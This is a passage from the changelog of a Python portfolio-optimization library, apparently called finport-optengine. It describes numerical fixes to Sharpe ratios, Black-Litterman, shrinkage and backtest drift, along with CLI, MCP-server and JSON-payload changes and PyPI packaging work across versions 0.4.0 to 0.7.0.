  keys — so a reader learned that `missing_returns` had been recorded but
  never which assets were missing.
- **NCO sub-solves go through `optimize()`.** Both layers called `_solve()`
  directly, skipping the weight cleaning, bounds recording and compliance
  diagnostics — the one method that solves twice was the one whose
  intermediate results were never checked. Weights move by 1e-07; a solve
  costs 20–24% more.
- **Importing the package no longer installs a warnings filter.** It is
  installed on the first solve instead, still process-wide.

### Changed

- **The headline Sharpe ratio is arithmetic.** Three definitions coexisted:
  geometric in `sharpe_ratio`, arithmetic in `rolling_metrics`, arithmetic
  per-period in the selection module — so the deflated Sharpe was deflating an
  arithmetic figure against a distribution of geometric ones. The per-period
  arithmetic Sharpe, `mean(excess) · ppy / (σ · √ppy)`, is now canonical,
  because it is the quantity PSR, DSR and MinTRL are derived on. The geometric
  form, `annualize_returns(excess) / annualize_volatility`, survives as
  `sharpe_ratio(..., method="geometric")` and reproduces the old number
  exactly. `summary_stats` keeps it visible for one release as
  `"Sharpe Ratio (geometric)"`.

  On the sample panel, equal-weight: **0.5950 → 0.6238**, 4.8% higher. At a 3%
  risk-free rate the same series moves 0.2441 → 0.2852, 16.8% higher — the gap
  widens as the excess mean shrinks.

  Sortino, Calmar and Martin keep geometric numerators; changing them was out
  of scope, but their docstrings and `summary_stats` now say so, because an
  arithmetic Sharpe standing silently beside a geometric Sortino is the same
  disagreement this change exists to remove.
- **The backtest result hash rounds to twelve significant figures and includes
  the weight path.** It rounded to twelve *absolute* decimals, which is stable
  at the default `initial_capital=1.0` but sits below float64's resolution
  once a caller sets realistic capital, so one ulp of BLAS noise flipped it.
  The digest also ignored holdings, so two runs with identical NAV and trades
  but different books collided. `RunMeta` gains `hash_version = 2`; hashes
  stored by earlier versions are not comparable to new ones.
- **`pandas>=2.2`.** `fill_method=None` is silent from 2.1, but the backtest
  calendar and the reporting resamplers use the `ME`/`QE`/`YE` frequency
  aliases, which arrived in 2.2 — so 2.1 was never a version this code could
  run on. The declared floor said otherwise until a CI cell pinned to it
  failed 43 tests with `Invalid frequency: ME`.
- **`expected_returns_from_history("mean")` is the arithmetic annualized
  mean.** It returned the geometric mean, so every μ-driven optimizer paired a
  geometric μ with an arithmetic Σ — a single-period model fed a multi-period
  estimate. The old formula is `"geometric_mean"` and reproduces the previous
  numbers exactly. On the sample panel, `max_sharpe` moves from 7.05% to 8.51%
  expected return and its Sharpe from 0.595 to 0.681; per-asset μ moves
  between +13bp and +244bp, except Cash, which falls 3bp because its
  compounding term exceeds half its variance. The same formula was written out
  in six places — including twice inside the covariance module, in the shrunk
  mean and in CAPM's market return — and now has one definition site, which a
  test enforces.
- **`cvar_annualized` → `cvar_sqrt_t_scaled`, `var_annualized` →
  `var_sqrt_t_scaled`.** A √T scaling holds under iid-Gaussian returns and is
  not an annualization. The old keys are written alongside the new ones for
  one release, with a `DeprecationWarning` raised at solve time — a warning on
  *read* is impossible here, because both serialization paths splat or copy
  the mapping and never call `__getitem__`.
- **`cdar_solver_objective` → `cdar_solver_zeta`**, which is what it held: the
  drawdown threshold, the same quantity CVaR calls `cvar_solver_zeta`.
  `cdar_solver_objective` now holds the objective.
- **`max_diversification` declares `bounds_mode="hard_or_projected"`.** It
  advertised `"hard"` for a method that can run projected.
- **A payload schema bump to 1.1** for the added `alignment` key.
- **`accept_inaccurate` defaults to `False`.** The solver chain settled for an
  `optimal_inaccurate` answer with a logged warning; a degraded answer returned
  by default is how a wrong book ships. It now raises, and the message names
  every way to proceed. The refusal also reports the right status: it used to
  raise with whatever the *last* solver in the chain said, so a run that found
  an unverifiable answer and then hit a solver returning `infeasible` was told
  its mandate had no solution. The setting travels as an ambient scope, because
  NCO builds its sub-optimizers internally and constructor threading cannot
  reach them.
- **`optengine check` exits 2 for an impossible mandate** and keeps 1 for
  unusable data. A finding that only says the solver could not answer is a
  warning, not a fatal.
- **Payload schema 2.0, then 2.1.** Feasibility issues are now objects with
  `code`, `severity`, `message` and `suggestion` instead of stringified
  dataclass reprs, and carry `stage_reached` and `reachable_return`; 2.1 adds
  the `audit` key, and 2.2 the `stress` key — stress reached the console and
  the Excel export but not the payload, so an agent calling the CLI could not
  see it at all.

### Added

- **Type checking in CI.** `py.typed` has shipped since 0.4 with nothing
  checking it. mypy now runs over the package; the 45 modules that do not yet
  pass are listed in an allowlist that a test holds to a ceiling and that may
  only shrink.
- **`config/shocks.yaml` and `config/universe.yaml`**, so the documented
  `--stress` and `--universe` commands run from a clean checkout. The
  universe example reads only the reserved `returns` panel, needs no data
  file beside it, and produces all three eligibility states on the sample
  panel — which is the point of shipping it.
- **A Stress tab and a Universe tab in the app.** The universe heatmap gives
  "not evaluable" its own colour rather than a shade of "ineligible", in
  three flat bands so it cannot read as half-eligible, with the state named
  in words on hover.
- **A Windows test cell and a pandas 2.2 cell** in CI. The first exercises the
  cache's `os.replace`; the second pins the declared floor, which is the only
  version in the matrix whose `pct_change` still pads and so the only one
  that can see that fix regress.
- **A point-in-time universe layer**, `optimization_engine.universe`. `Signal`
  is a date-by-asset frame with three states — true, false, and *not
  evaluable* — under Kleene logic, because a rolling liquidity rule knows
  nothing during its warm-up and answering "ineligible" there excludes names
  for a reason that has nothing to do with them. `Eligibility` builds
  membership from threshold, rank and rolling rules (windows strictly prior to
  the evaluation date), with hysteresis, reconstitution-date holding, breadth,
  turnover and an `explain(date, asset)` that names the deciding clause.
  `Classification` gives labels an effective date and refuses to answer
  without one. `run_backtest` and `walk_forward_run` both take a `universe`;
  the walk-forward masks the solve window's columns, and delisting is measured
  only on data up to the decision date. `to_mask` has no default policy — the
  caller names one.
- **`ConstraintLayer.from_classification`**, building a layer from labels as of
  a date.
- **A post-solve mandate audit.** `audit_weights` gives the compliance check a
  public surface, `OptimizationResult.audit` carries it, and
  `EngineConfig.strict_mandate` turns a reported breach into a raised
  `MandateViolationError`. Most of the checking already existed; what is new is
  that the audit reindexes onto the *declared universe* first, so an asset
  missing from the weight vector can no longer escape its own lower bound, and
  that a clean report records the tolerance it was clean at. NCO's sub-solves
  opt out — their constraint set deliberately omits the mandate's bounds,
  which are applied by projection after both layers.
- **A structural feasibility stage that needs no solver.** `analyze_feasibility`
  now answers box capacity against the budget, per-bucket capacity, parent
  coherence and instructions naming absent assets by arithmetic, before any
  solver is involved, and reports `stage_reached`. Box-and-budget mandates get
  their reachable return range from a fractional knapsack in closed form —
  exact, and zero solves where it used to cost two.
- **`--accept-inaccurate`, `--strict-mandate` and `--stress` on the CLI**, and
  an Advanced panel in the app for the first.

### Removed

- **The frontier's "Dominated (below min-variance)" trace.** A return target is
  now a floor, so a mean-variance sweep cannot reach the lower branch to draw
  it. `show_dominated` remains as a documented no-op for one release.



## [0.5.3] — 2026-09-01

Five numerical fixes from a full-package review, and the interface fixes
that followed it; the review itself is in
`docs/reviews/2026-09-01-code-review.md`. Each numerical fix changes a
number a user may already be looking at, and each is listed with what moves.

### Fixed

- **Backtest drift no longer forces full investment.** The simulation core
  renormalized drifted weights by the sum of the positions, which is the
  book's growth only when the book is fully invested. Any cash residual was
  silently converted into positions after one period, and a 60/−40 long-short
  book became 264/−164 on its second bar. Weights now drift by the book's own
  growth, `1 + w·r`. A fully invested target replays exactly as before; every
  non-fully-invested backtest — `fully_invested=False`, a partial target, a
  long-short book — moves.
- **A missing return no longer poisons the NAV path.** `0 × NaN` made every
  period from the first gap onward NaN, even for a name the book never held.
  A gap is now a flat period for that asset alone; a gap on a *held* asset is
  recorded on `meta.notes["missing_returns"]` so it reads as the data problem
  it is.
- **Comparisons score both streams over their common window.**
  `compare_in_and_out_of_sample` and `compare_performance` padded the shorter
  stream with NaN, which `annualize_returns` and `hit_rate` counted as zero-
  return periods and `var_historic` turned into NaN. On the sample panel that
  reported a walk-forward CAGR of −2.9% for a stream that made −5.8%, and
  flattered the `Degradation` column whenever the out-of-sample run was
  losing. The two functions now align on the periods both streams cover, and
  the three metrics count observations rather than rows, so an isolated gap
  anywhere is neither a return nor a loss.
- **Black-Litterman with no views now returns the market portfolio.** The
  equilibrium prior `π = δΣw` is the first-order condition of
  `μ'w − (δ/2)·w'Σw`, but the mean-variance sub-solve it fed maximizes
  `μ'w − λ·w'Σw` with no half, so the effective aversion was doubled and the
  no-view answer sat exactly halfway between the market and the minimum-
  variance portfolio. The sub-solve now receives `λ = δ/2`. Every
  `black_litterman` allocation moves, toward the market portfolio.
- **`BlackLittermanOptimizer.optimize()` is idempotent.** It used to write the
  posterior back over `cov_matrix` and `expected_returns`, so a second call
  reverse-optimized from the first call's answer and the weights drifted on
  every solve. The posterior now lives on the optimizer privately; the
  result's return and risk are still reported against it, and the inputs are
  left as given. Code that read `optimizer.cov_matrix` *after* a solve and
  expected the posterior will now see the prior.
- **Max-Sharpe and max-diversification honour a `leverage` cap.** The
  homogeneous reformulation translated bounds, layers and the benchmark
  budgets into ray space and skipped the gross-exposure cap, so a 1.2× mandate
  could come back at 2.5× gross with nothing in `ignored_constraints`. The cap
  is now a hard constraint of the ray-space solve. `fully_invested=False`
  cannot be expressed on a ray at all; both optimizers now warn and record it
  in `result.extras["ignored_constraints"]` instead of silently returning a
  fully invested book.
- **Bayes-Stein shrinkage is computed on per-period moments.** Jorion's
  intensity `(N+2) / ((N+2) + T·q)` counts observations in `T`, so the
  quadratic form `q` has to be per-observation too; `shrunk_mean` handed it
  annualized means and covariance, inflating `q` by the annualization basis
  and leaving daily data some 250 times under-shrunk. `james_stein_shrinkage`
  takes a `periods_per_year` (default 252, matching
  `expected_returns_from_history`) and divides the quadratic form by it.
  Every `expected_returns_method="shrunk_mean"` vector moves, toward the
  minimum-variance portfolio's return.
- **`check`, `optimize` and `backtest` build their inputs the same way.** The
  three commands each assembled config, panel, currency, universe and
  benchmark by hand, and had drifted: `optimize` refused a config with no
  `expected_returns` block that `check` had just called ready; `check` never
  saw `--base-currency`, `--benchmark` or the two active-risk limits;
  `backtest` seeded zero expected returns for its first solve, so a return
  target with no explicit vector was infeasible before the walk-forward
  started. One `_prepare_inputs` now serves all three, `check` accepts the
  flags `optimize` does, and a config that relies on `expected_returns_method`
  solves everywhere it pre-flights. When `--ingest-currency` has already
  converted the panel, `config.currencies` is no longer applied a second time.
- **`--json` failures carry their reason.** A command that *returned* a
  non-zero code, rather than raising, emitted `"the command exited before
  producing a result"`; the message it printed to stderr now travels in the
  payload's `error` field.
- **MCP `optimizer=` keeps the rest of the mandate.** It replaced the whole
  optimizer block, so a max-Sharpe override solved against a risk-free rate
  of zero on a config that said 4%, and dropped the return target with it.
- **MCP `optimize` reports an infeasible mandate as a `ToolError`.** The
  branch that wrapped the feasibility report was unreachable, because the
  engine's default lets the solver fail instead; the client saw a wrapped,
  message-less exception. Solver failures are wrapped the same way.
- **MCP `backtest` is shaped by its config.** The spec is now built on the
  config's `periods_per_year` (a monthly config was simulated as daily),
  trades only when the process re-solves (`frequency="none"`, matching the
  CLI and `EngineRun.walk_forward_run`), measures Sharpe against the
  config's risk-free rate, and defaults `lookback`/`rebalance_every` from the
  basis rather than from hard-coded daily counts.
- **The ingest cache refuses what it must not keep.** A panel with a failed
  or missing identifier was cached and served for the TTL as "the provider
  returned no series", never retried; a panel whose currency conversion had
  fallen back to native quotes was cached under a fingerprint claiming the
  base currency. Neither is stored now, and the run says `Not cached:` with
  the reason. The cache key also covers the provider options, so the `file`
  provider no longer serves file A's panel for file B.
- **FX alignment no longer back-fills from the future.** A leading gap in
  the rate history — prices starting before the first known rate — was
  filled with a *later* rate without limit. It is now filled for at most
  `MAX_LEADING_FX_GAP` (5) rows, the case of a request that starts on a
  holiday, and refused with an `FXError` beyond that; `fill="bfill"` asks for
  it explicitly. `fill="bfill"` also works on pandas 3, where the
  `fillna(method=)` it used to call no longer exists.
- **A config with a key the loader does not read is refused.** `max_tracking_eror:
  0.03` loaded cleanly and constrained nothing; `EngineConfig.from_dict` now
  raises `ConfigurationError` naming the unknown key, and an unknown optimizer
  key raises the same rather than a bare `TypeError`. The shipped
  `config/indices.yaml` spelled its currency block `asset_currency`, which
  nothing read; it is `currencies` now, so its non-USD indices are converted.

## [0.5.2] — 2026-09-01

Documentation only. No behaviour changed, no signature moved, and the test
suite is untouched — but the reference the library never had now exists, and
CI fails if it stops building.

### Added

- **A generated API reference.** `scripts/build_api_docs.py` renders every
  public module with pdoc and a new `docs` extra installs it. A `Docs`
  workflow builds it on every pull request and publishes it to GitHub Pages
  from `main`. The build runs `--strict`, which refuses to skip a module it
  cannot import: a missing extra now fails the job rather than quietly
  dropping `mcp_server` from the published pages. Modules are discovered by
  walking the package, so a new one is documented the day it lands.
- **`docs/ERRORS.md`** — the refusal contract, written down. All twenty-one
  exception types grouped by what they mean (your inputs are wrong; your
  mandate is impossible; the world got in the way), the full `IngestError`
  hierarchy with what the service does about each subclass, the CLI's exit
  codes and the one case where `--json` changes them, and a closing section on
  the failures that are *reported* rather than raised — degraded cost models,
  skipped identifiers, post-solve constraint breaches, data-quality findings.
  Linked from the README, `AGENTS.md` and `llms.txt`.

### Changed

- **Docstring coverage went from 74.6% to 100%** across the 677 public
  definitions: 166 that had none now do. The parameter documentation moved
  further — 86 functions documented their arguments before, 379 do now — and
  it carries units where a number has any: `cost_bps` per side, `execution_lag`
  in bars, `alpha` as a tail probability rather than a confidence level, VaR
  levels in percent rather than as fractions.
- **Every public function that raises now declares what and when.** There were
  364 `raise` statements behind 67 `Raises:` sections; the gap is closed. The
  same for returns: what a function hands back, in what units, and what it
  does with the values it could not compute.
- `AGENTS.md` states that docstrings are the API reference's only source, and
  therefore part of the public surface rather than a courtesy.


## [0.5.1] — 2026-08-31

A patch: one bug, in the part of `--json` that only a failing run reaches.
Nothing an optimizer, estimator or backtest produces is different.

### Fixed

- `--json` emitted nothing at all when a command raised. The mode promised
  that a failure still produces a parseable document, and delivered it only
  for a command that *returned* a non-zero code — a raised exception, an
  unreadable config being the cheapest way in, propagated instead: traceback
  on stderr, stdout empty. That is precisely the "no output versus output I
  could not parse" ambiguity the flag exists to remove, and it was reachable
  from all four commands. The payload now survives the exception and carries
  the exception's type and message; the traceback still goes to stderr, where
  someone debugging it looks.

### Changed

- The README announces the agent-facing surface instead of leaving it in the
  changelog: the MCP server has its own section with the install, the
  registration for a JSON-config client and for `claude mcp add`, and what
  each of the five tools answers; `--json` is documented in the CLI section
  with real `jq` output rather than a sketch of it. The development install
  gains the `mcp` extra it needed to run the MCP tests.

## [0.5.0] — 2026-08-31

A minor rather than a patch: this adds public API surface — an optional
dependency, a second console script, and a function lifted out of
`run_engine` — on top of a fix to a pre-flight check that was validating a
different mandate from the one it preceded.

### Fixed

- `check` validated a different mandate from the one `optimize` solved. On a
  config with no `expected_returns` block it derived the vector as zeros
  while `run_engine` derived it from the return history, so the pre-flight
  reported a reachable return range of exactly zero to zero and would call a
  target unreachable that the solve then reached. Both now go through
  `resolve_expected_returns`, extracted from `run_engine` so the two cannot
  drift apart again. Affects `optengine check` and the MCP `check_mandate`.

### Added

- CI runs the MCP suite. The `mcp` extra is in no other job's install — it
  cannot go in the 3.9-inclusive matrix — so those tests would have
  skipped everywhere and looked like coverage. The Streamlit job now
  covers both optional-extra surfaces and is named for it, and asserts
  the `optengine-mcp` console script lands on PATH.
- An MCP server, `optengine-mcp`, behind the `mcp` extra (Python 3.10+).
  Five tools — `list_optimizers`, `describe_optimizer`, `check_mandate`,
  `optimize`, `backtest` — returning the same payloads as `--json`, from the
  same module, so the two cannot disagree. Anticipated failures raise the
  SDK's `ToolError`, which is the only class whose message reaches the
  client; anything else is wrapped as "Error executing tool optimize" with
  the reason discarded.

- `--json` on `optimize`, `backtest`, `check` and `describe`. Human
  narration moves to stderr, so stdout is one parseable document and an
  agent or pipeline can act on a result without scraping a formatted table.
  Every payload carries `schema_version`, and a command that fails before
  producing a result still emits JSON — an object with `error` and
  `exit_code` — so a caller never has to distinguish "no output" from
  "output I could not parse".
- `optimization_engine.reporting.payloads`, the JSON contract as an
  importable module rather than formatting buried in the CLI. Keys are
  chosen for the reader instead of inherited from the attributes they came
  from, and a value absent this run is `null` rather than a missing key, so
  a consumer can test a value and never a key.
- `AGENTS.md` and `llms.txt` — an API map for coding agents, including the
  mistakes that cost real debugging time here: `sample_dataset()` returns
  prices rather than returns, the solver is in `result.extras`, the
  backtest hashes are on `result.meta`, and unconstrained `max_sharpe` puts
  98.5% in cash on the sample panel.

## [0.4.1] — 2026-08-31

A correctness and packaging release. Two of the three entries below only
reach you if you had `riskfolio-lib` installed or read the project page on
PyPI; the third is the reason the first two are worth a release at all.

### Fixed

- `covariance_method="shrink"` no longer means different mathematics on
  different machines. It routed through `riskfolio-lib` when that package
  happened to be installed and fell back to scikit-learn's Ledoit-Wolf when
  it did not — a silent fork, since `CovarianceDiagnostics` recorded no such
  thing, so the same config on the same data produced different numbers with
  nothing in the output saying which estimator had run. On the sample panel
  the two differ by 8.3% of the largest element, which is an estimator
  change, not a rounding difference. Worse, the fallback caught bare
  `Exception`, so any riskfolio error or API change swapped the estimator
  silently too.

  `shrink` is now a documented alias for `ledoit_wolf`, so configs and saved
  scenarios written against it keep loading and now reproduce anywhere. The
  `extras` optional dependency, whose only purpose was this route, is gone.

- The README renders on PyPI. Every image and repository link was a relative
  path, which resolves against the repo on GitHub and against nothing on
  PyPI — all nine figures were broken on the project page, along with the
  links to the licence and the research notes. They are absolute now.

### Changed

- The README leads with the install command and a runnable quickstart
  instead of burying `pip install` 600 lines down. The example's printed
  output is checked against what the code in that same block actually
  produces, so it cannot drift into fiction.

## [0.4.0] — 2026-08-31

The release that makes the project installable from PyPI. No optimizer,
estimator or backtest changed behaviour: every number this version produces
matches 0.3.0.

### Changed

- **The distribution is now named `finport-optengine`.** `optimization-engine`
  is taken on PyPI by an unrelated energy-forecasting package. The import
  name (`optimization_engine`) and the console script (`optengine`) are
  unchanged, so only the install command moves:
  `pip install finport-optengine`.
- **The core install is smaller by roughly 190MB.** `plotly`, `openpyxl`,
  `xlsxwriter` and `statsmodels` are no longer mandatory dependencies; they
  now sit behind the `viz`, `excel` and `stats` extras. Anything the core
  can already do — every optimizer, the covariance estimators, the backtest,
  the analytics — still works on a bare `pip install finport-optengine`.

  Reaching a feature whose extra is absent now raises
  `optimization_engine._optional.MissingDependencyError` (a subclass of
  `ImportError`) naming the install command, instead of a
  `ModuleNotFoundError` for an import the caller never wrote.

  To keep the previous all-inclusive install, use
  `pip install "finport-optengine[all]"`.

  `scikit-learn` deliberately stays in the core: it backs the *default*
  covariance estimator, so demoting it would either break the first call in
  the README on a fresh install or silently change the default to the
  sample covariance.

### Added

- A release workflow (`.github/workflows/release.yml`) publishing through
  Trusted Publishing (OIDC), so no API token is stored in the repository.
  A manual run publishes a fresh `.devN` to TestPyPI and then installs it
  back *from* TestPyPI to prove the artifact is reachable; pushing a `v*`
  tag publishes to PyPI behind a required-reviewer gate. The build refuses
  to proceed if `pyproject.toml` and `__init__.py` disagree on the version,
  or if a tag does not match the version it claims.
- `docs/RELEASING.md` — the one-time Trusted Publishing setup each index
  needs, the release procedure, and what to do about a bad release.

- `optimization_engine.ingest` is reachable as an attribute of the top-level
  package, and its four most-used names — `IngestRequest`, `IngestResult`,
  `IngestError`, `PricePanel` — are re-exported at the top level. The
  subpackage's full 44-name API is unchanged and stays where it was; the
  generic field constants (`CLOSE`, `OPEN`, `VOLUME`, …) are deliberately
  *not* raised to the top level.
- `py.typed`, so type checkers actually consume the project's annotations.
  The marker had been declared in `pyproject.toml` since the package was
  laid out, but the file itself was never added — meaning no downstream
  user has ever received the types.
- `[project.urls]`, so the PyPI page links to the repository, the issue
  tracker and this file.
- An `all` extra, covering what the CLI and the README's worked examples
  assume.
- This changelog.

### Removed

- `matplotlib` and `seaborn` as dependencies. Nothing in the project has
  ever imported either one — the plotting is entirely Plotly. Removing them
  changes no behaviour.
- `requirements.txt`. It listed `streamlit`, `yfinance`, `riskfolio-lib` and
  `ipywidgets` as mandatory, contradicting `pyproject.toml`, which has them
  as extras. `pyproject.toml` is now the single source of truth; install the
  development set with `pip install -e ".[all,ui,extras,dev]"`.

### Fixed

- The release workflow could never publish. `pypa/gh-action-pypi-publish`
  was referenced by commit SHA — the usual supply-chain advice, and wrong
  for this action: it is a Docker action, and the runner pulls
  `ghcr.io/pypa/gh-action-pypi-publish` tagged with whatever ref the `uses:`
  line carries. PyPA publishes that image only under release tags, so the
  SHA resolved to no manifest and the step died with `manifest unknown`
  before reaching the index. Now referenced as `@v1.14.2`, a tag confirmed
  to exist in the registry, with the reasoning recorded in
  `docs/RELEASING.md` so nobody "hardens" it back.

- Excluded `scs` 3.3.0. Its wheel ships an incomplete Intel oneMKL bundle,
  so importing it and solving aborts the interpreter — "Cannot load
  libmkl_avx512.so.3 or libmkl_def.so.3" — rather than raising. SCS sits in
  `SOLVER_FALLBACK`, so any solve that got past CLARABEL and ECOS would take
  the process down with it, with no traceback and nothing for the fallback
  chain to catch. Reproduced on GitHub's runners and in a local container;
  3.2.11 is unaffected. `scs` is now named directly in the dependencies,
  since the engine reaches for it by name rather than leaving the choice to
  cvxpy. Remove the exclusion once a fixed release ships.

## [0.3.0] and earlier

Released before this changelog was kept. The repository's commit history is
the record; the headline work was the data-ingestion spine (one panel, many
providers, with per-identifier provenance), the stateless backtest core with
its cost model and trial counting, the walk-forward and final-holdout audit
path, and the constraint-layer editor in the Streamlit app.

[Unreleased]: https://github.com/alanvaa06/finport-optengine/compare/v0.7.0...HEAD
[0.7.0]: https://github.com/alanvaa06/finport-optengine/compare/v0.5.3...v0.7.0
[0.5.3]: https://github.com/alanvaa06/finport-optengine/compare/v0.5.2...v0.5.3
[0.5.2]: https://github.com/alanvaa06/finport-optengine/compare/v0.5.1...v0.5.2
[0.5.1]: https://github.com/alanvaa06/finport-optengine/compare/v0.5.0...v0.5.1
[0.5.0]: https://github.com/alanvaa06/finport-optengine/compare/v0.4.1...v0.5.0
[0.4.1]: https://github.com/alanvaa06/finport-optengine/compare/v0.4.0...v0.4.1
[0.4.0]: https://github.com/alanvaa06/finport-optengine/releases/tag/v0.4.0
